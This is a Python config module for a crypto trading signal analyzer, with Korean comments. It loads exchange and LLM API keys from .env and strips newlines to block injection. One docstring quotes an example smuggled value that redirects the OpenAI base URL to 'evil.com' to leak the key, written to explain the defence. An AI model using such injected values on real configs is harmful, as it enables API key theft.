# =============================================
# Crypto Trading Signal Analyzer - Config
# =============================================
# ⚠️ 보안 주의: API 키는 .env 파일에서 관리합니다.
#    .gitignore에 .env를 반드시 추가하세요!

import hmac
import os
from pathlib import Path
from dotenv import load_dotenv

# .env 파일 로드 (실행 위치와 무관하게 현재 파일 기준으로 탐색)
_BASE_DIR = Path(__file__).resolve().parent
load_dotenv(_BASE_DIR / ".env")
load_dotenv()


def _safe_env(key: str, default: str = "") -> str:
    """환경변수를 읽고 CRLF 문자를 제거합니다.

    .env 파일에 개행문자(\n, \r)가 포함된 값이 있으면
    python-dotenv 가 추가 변수를 주입(CRLF Injection)할 수 있습니다.
    예: OPENAI_API_KEY=sk-xxx\nOPENAI_BASE_URL=https://evil.com
    → AI SDK 가 공격자 서버로 API 키를 전송하는 취약점.
    이를 방지하기 위해 모든 env 값에서 개행문자를 제거합니다.
    """
    val = os.getenv(key, default) or default
    return val.replace("\r", "").replace("\n", "").strip()


def _safe_int_env(key: str, default: int, minimum: int, maximum: int) -> int:
    try:
        value = int(_safe_env(key, str(default)))
    except (TypeError, ValueError):
        value = default
    return max(minimum, min(maximum, value))


def _safe_float_env(key: str, default: float, minimum: float, maximum: float) -> float:
    try:
        value = float(_safe_env(key, str(default)))
    except (TypeError, ValueError):
        value = default
    return max(minimum, min(maximum, value))


def _safe_bool_env(key: str, default: bool = False) -> bool:
    raw = _safe_env(key, "1" if default else "0").lower()
    return raw in ("1", "true", "yes", "on")


def _safe_csv_env(key: str, default: str) -> list[str]:
    raw = _safe_env(key, default)
    values = []
    for part in raw.split(","):
        item = part.strip().upper()
        if item and item not in values:
            values.append(item)
    return values


# 기본값 "changeme" 와 동일한 값은 "비밀번호 미설정" 으로 취급하기 위한 상수
_OWNER_PASSWORD_DEFAULT = "changeme"


def owner_password_configured() -> bool:
    """OWNER_PASSWORD 가 실제로 설정되어 있는지 여부.

    - 비어 있으면 False
    - 기본값 'changeme' 그대로면 False
    → 실제로 비밀번호를 바꾼 경우에만 인증 기능을 허용한다.
    """
    pw = OWNER_PASSWORD
    return bool(pw) and pw != _OWNER_PASSWORD_DEFAULT


def verify_owner_password(supplied: object) -> bool:
    """타이밍-공격 내성으로 OWNER_PASSWORD 를 비교.

    - 비밀번호가 설정되지 않았으면 어떤 값이 와도 False (기능 비활성)
    - 입력이 str 이 아니면 False
    - hmac.compare_digest 로 상수 시간 비교
    """
    if not owner_password_configured():
        return False
    if not isinstance(supplied, str):
        return False
    return hmac.compare_digest(supplied.encode("utf-8"), OWNER_PASSWORD.encode("utf-8"))


def sanitize_env_value(value: object) -> str:
    """.env 파일에 기록할 값을 안전하게 정리.

    - str 이 아니면 빈 문자열
    - CR/LF/NUL 제거 (줄바꿈 삽입 시 추가 환경변수 주입 가능)
    - 앞뒤 공백 제거
    """
    if not isinstance(value, str):
        return ""
    return value.replace("\r", "").replace("\n", "").replace("\x00", "").strip()


OPENAI_API_KEY = _safe_env("OPENAI_API_KEY")
OPENAI_MODEL   = _safe_env("OPENAI_MODEL", "gpt-4.1")

# Claude remains as an optional fallback for existing installs.
CLAUDE_API_KEY = _safe_env("CLAUDE_API_KEY")
CLAUDE_MODEL   = _safe_env("CLAUDE_MODEL", "claude-sonnet-4-6")

BINANCE_BASE_URL    = "https://api.binance.com"
BINANCE_FUTURES_URL = "https://fapi.binance.com"
BINANCE_API_KEY     = _safe_env("BINANCE_API_KEY")
BINANCE_SECRET_KEY  = _safe_env("BINANCE_SECRET_KEY")
DEFAULT_SYMBOL      = _safe_env("DEFAULT_SYMBOL", "BTCUSDT").upper()


def symbol_to_pair(symbol: str) -> str:
    symbol = (symbol or "").upper()
    quote_candidates = ("USDC", "USDT", "FDUSD", "BUSD", "TUSD", "USD", "BTC", "ETH", "BNB")
    for quote in quote_candidates:
        if symbol.endswith(quote) and len(symbol) > len(quote):
            return f"{symbol[:-len(quote)]}/{quote}"
    return symbol

# ── 매매 설정 (참고용 레버리지) ──────────────
DEFAULT_LEVERAGE      = 3       # 희망 레버리지 배수

OWNER_PASSWORD = _safe_env("OWNER_PASSWORD", _OWNER_PASSWORD_DEFAULT)  # 주인장 확성기 비밀번호

# 분석할 시간봉 목록
TIMEFRAMES = ["5m", "15m", "1h", "4h", "1d"]

# 각 시간봉별 로드할 캔들 수
CANDLE_LIMIT = 200

# 자동 갱신 기본 간격 (초)  ← 30분
AUTO_REFRESH_INTERVAL = 1800

# Runtime safety knobs for small Lightsail instances. Defaults favor low RAM/CPU.
WORKER_THREADS = _safe_int_env("BITSWIPE_WORKER_THREADS", 4, 2, 16)
MARKET_FETCH_WORKERS = _safe_int_env("BITSWIPE_MARKET_FETCH_WORKERS", 3, 1, 5)
LLM_REQUEST_TIMEOUT_SECS = _safe_float_env("BITSWIPE_LLM_TIMEOUT_SECONDS", 90.0, 15.0, 300.0)
YFINANCE_TIMEOUT_SECS = _safe_float_env("BITSWIPE_YFINANCE_TIMEOUT_SECONDS", 8.0, 3.0, 30.0)
ACCOUNT_INCOME_CACHE_TTL_SECS = _safe_float_env("BITSWIPE_ACCOUNT_INCOME_CACHE_TTL_SECONDS", 30.0, 5.0, 300.0)
PERFORMANCE_HISTORY_MAX_LINES = _safe_int_env("BITSWIPE_PERFORMANCE_HISTORY_MAX_LINES", 50000, 1000, 500000)

# Lightweight multi-asset WATCH scanner. Disabled by default; no LLM calls.
WATCH_ENABLED = _safe_bool_env("BITSWIPE_WATCH_ENABLED", False)
WATCH_CRYPTO_SYMBOLS = _safe_csv_env(
    "BITSWIPE_WATCH_CRYPTO_SYMBOLS",
    "BTCUSDT,ETHUSDT,SOLUSDT,XRPUSDT",
)
WATCH_TRADFI_SYMBOLS = _safe_csv_env(
    "BITSWIPE_WATCH_TRADFI_SYMBOLS",
    "SOXL,QQQ,EWY",
)
WATCH_SCAN_INTERVAL_SECONDS = _safe_int_env(
    "BITSWIPE_WATCH_SCAN_INTERVAL_SECONDS",
    900,
    300,
    86400,
)
WATCH_ALERT_COOLDOWN_SECONDS = _safe_int_env(
    "BITSWIPE_WATCH_ALERT_COOLDOWN_SECONDS",
    21600,
    900,
    172800,
)
WATCH_DAILY_CAP = _safe_int_env("BITSWIPE_WATCH_DAILY_CAP", 3, 0, 20)
WATCH_CACHE_TTL_SECONDS = _safe_int_env("BITSWIPE_WATCH_CACHE_TTL_SECONDS", 300, 60, 3600)
WATCH_MAX_WORKERS = _safe_int_env("BITSWIPE_WATCH_MAX_WORKERS", 3, 1, 6)
WATCH_LOG_MAX_LINES = _safe_int_env("BITSWIPE_WATCH_LOG_MAX_LINES", 1000, 100, 10000)
WATCH_TRADFI_STALE_HOURS = _safe_float_env("BITSWIPE_WATCH_TRADFI_STALE_HOURS", 8.0, 1.0, 72.0)

# ── 색상 팔레트 ──────────────────────────────
BG_COLOR      = "#0d0d1a"   # 배경
PANEL_COLOR   = "#13132a"   # 사이드 패널
ACCENT_COLOR  = "#1e1e4a"   # 강조 영역
TEXT_COLOR    = "#dce1f0"   # 기본 텍스트
GREEN_COLOR   = "#00e676"   # 매수
RED_COLOR     = "#ff1744"   # 매도
YELLOW_COLOR  = "#ffd740"   # 홀드 / 강조
BLUE_COLOR    = "#40c4ff"   # 보조
PURPLE_COLOR  = "#ce93d8"   # RSI 선


# ── Owner-only HTTP session protection bootstrap ──────────────
# server.py imports the FastAPI class before importing config, then creates app only
# after this module finishes loading. Arm the already-imported class constructor so
# the next FastAPI instance receives owner-only middleware without modifying the
# legacy server body.
def _arm_owner_http_security() -> None:
    import sys
    from owner_auth import arm_fastapi_owner_security

    arm_fastapi_owner_security(sys.modules[__name__])


_arm_owner_http_security()
